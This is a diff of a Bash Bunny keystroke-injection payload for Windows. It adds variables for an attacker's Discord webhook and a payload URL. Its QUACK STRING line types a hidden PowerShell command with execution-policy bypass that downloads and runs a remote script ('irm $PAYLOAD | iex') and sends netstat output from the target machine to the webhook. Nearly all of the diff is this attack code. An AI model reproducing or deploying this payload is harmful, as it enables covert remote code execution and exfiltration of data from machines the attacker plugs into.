@@ -12,27 +12,27 @@ ATTACKMODE HID
 
 # Put 1 on the function that you want to active, else 0. Functions available:
 # - default (simple 'netstat' command)
-# - routing_table $r
-# - listening_canonical $lc
-# - listening_numerical $ln
-# - all_canonical $ac
-# - all_numerical $an
+# - routing_table \$r
+# - listening_canonical \$lc
+# - listening_numerical \$ln
+# - all_canonical \$ac
+# - all_numerical \$an
 # - offload ot
-# - proto $p '<protocol>'
-# - - In this option you must put the protocol that you want to monitor, for example $p='TCP' if you want to monitor TCP, else leave blank, so $p=''.
+# - proto \$p '<protocol>'
+# - - In this option you must put the protocol that you want to monitor, for example \$p='TCP' if you want to monitor TCP, else leave blank, so \$p=''.
 
 # Requirements: 
 # - Internet connection
+
+# VARIABLES
+# - Provide your Discord WEBHOOK
+DISCORD_WEBHOOK='https://discordapp.com/api/webhooks/<webhook_id>/<token>'
+# Replace example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
+PAYLOAD='example.com'
 
 QUACK DELAY 2000
 QUACK GUI r
 QUACK DELAY 250
 QUACK DELETE
-QUACK STRING powershell -w h -ep bypass $discord='
-
-# REQUIRED - Provide your Discord WEBHOOK i.e. https://discordapp.com/api/webhooks/<webhook_id>/<token>
-QUACK STRING WEBHOOK
-
-# REQUIRED - Reply example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
-QUACK STRING ';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm PAYLOAD | iex
+QUACK STRING powershell -w h -ep bypass $discord='$DISCORD_WEBHOOK';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm $PAYLOAD | iex
 QUACK ENTER
